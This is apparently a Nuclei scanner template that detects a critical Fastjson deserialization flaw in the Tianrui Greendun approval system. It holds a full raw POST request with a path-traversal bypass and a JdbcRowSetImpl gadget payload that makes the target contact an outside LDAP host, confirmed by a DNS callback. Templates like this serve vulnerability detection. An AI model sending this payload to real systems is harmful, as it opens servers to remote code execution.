id: poc-yaml-tipray-gsas-findusertrustees-fastjson-deserialization
info:
  name: Tianrui Greendun Approval System findUserTrustees Fastjson Deserialization Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: deserialization,dnslog

variables:
  domain: "{{interactsh-url}}"
  random: "{{rand_text_alphanumeric(6)}}"

http:
  - raw:
      - |
        POST /trwfe/login.jsp/.%2e/rest/ext/findUserTrustees HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
            "@type": "com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName": "ldap://{{domain}}/{{random}}",
            "autoCommit": true
        }
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
